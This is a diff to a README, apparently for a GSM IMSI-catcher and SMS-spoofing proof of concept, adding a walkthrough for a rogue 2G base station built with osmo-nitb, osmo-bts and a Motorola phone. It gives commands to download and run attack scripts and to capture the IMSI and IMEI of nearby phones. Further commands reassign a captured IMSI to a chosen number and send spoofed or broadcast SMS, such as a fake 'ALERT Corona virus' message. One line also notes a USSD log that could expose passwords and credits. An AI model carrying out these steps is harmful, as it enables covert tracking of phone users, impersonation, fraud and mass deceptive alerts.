@@ -122,7 +122,6 @@ ADDING DEBUG MODE OPTIONS : --debug DRSL:DOML:DLAPDM
 Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  
 
 
-
   
 Tape *#*#4636#*#* and choose GSM only on your Android phone  
 Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
@@ -134,8 +133,7 @@ Have a look on the log about USSD: Own number requested
 
   
 Tape USSD *100*123#
-Have a look on log of USSB : Unhandled USSD  
-
+Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
   
 
 ctrl+shift+T
@@ -171,8 +169,21 @@ log should be :  subscriber extension 0341220590 sms sender extension 0341220590
 Hardware setup 1 : Need battery and not programmable with arduino  
 
 [serial_cable](https://osmocom.org/projects/baseband/wiki/Serial_Cable)    [smartspate](https://www.smartspate.com/how-to-create-2g-network-at-your-own-home/)   [sudonull](https://sudonull.com/post/69473-Launching-a-GSM-network-at-home-Pentestit-Blog)
+<p align="center">
+  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_motorola.jpg">
+</p>
+
+<p align="center">
+  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_cable_final.png">
+</p>
+
 
 Hardware setup 2 : No need battery and programmable with arduino  
+<p align="center">
+  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/USB_TTL.jpg">
+</p>
+
+
 
 ```
 wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
@@ -235,7 +246,85 @@ python2 sending_sms_broadcast.py
 ```
 log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
 
+Solution 2debug : using one motorola phone, manual script on debug mode
+```
+wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
+```
+```
+unzip osmo-nitb-scripts-calypsobts.zip 
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+Tape *#*#4636#*#* and choose GSM only on your Android phone  
+Installing network signal guru on your android phone  
+And finding the arfcn that this one is connect  
+Let's name this arfcn as 975  
+Configure arfcn at service/osmotrx.lms as 975
+```
+gedit service/osmotrx.lms
+```
+Save the configuration
+```
+bash install_services.sh 
+```
+```
+bash trx.sh
+```
+Click button power of motorola phone  
+Tape ctrl+shift+T  
+Launching osmo-nitb  with debug mode --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
+Database at : /usr/src/CalypsoBTS/hlr.sqlite3
+```
+osmo-nitb --yes-i-really-want-to-run-prehistoric-software -c /usr/src/CalypsoBTS/openbsc.cfg -l /usr/src/CalypsoBTS/hlr.sqlite3 -P -C --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
+```
+Launching osmo-bts  with debug mode option : --debug DRSL:DOML:DLAPDM
+```
+osmo-bts-trx -c /usr/src/CalypsoBTS/osmo-bts-trx-calypso.cfg --debug DRSL:DOML:DLAPDM -r 99
+```
 
+Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  
+
+
+  
+Tape *#*#4636#*#* and choose GSM only on your Android phone  
+Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
+Have a look on log for capturing IMSI and IMEI  
+
+  
+Tape *#001# for finding your phone number (extension with osmo-bts)   
+Have a look on the log about USSD: Own number requested  
+
+  
+Tape USSD *100*123#
+Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
+  
+
+ctrl+shift+T
+```
+cd osmo-nitb-scripts/scripts_spoof1
+```
+```
+bash finding_imsi_extenstion.sh
+```
+You could find imsi and extension  
+let's see for example imsi as 646040222463674 and extension as 126
+```
+bash set_imsi_extension.sh 646040222463674 0341220590
+```
+Verify by if the association is correct
+let's see for example imsi as 646040222463674 and extension as 0341220590
+```
+bash finding_imsi_extenstion.sh
+```
+```
+python2 sending_sms_spoof_byextension.py
+```
+Sending for all extensions in osmo-bts
+```
+python2 sending_sms_broadcast.py 
+```
+log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
 
 
 * Remark : 
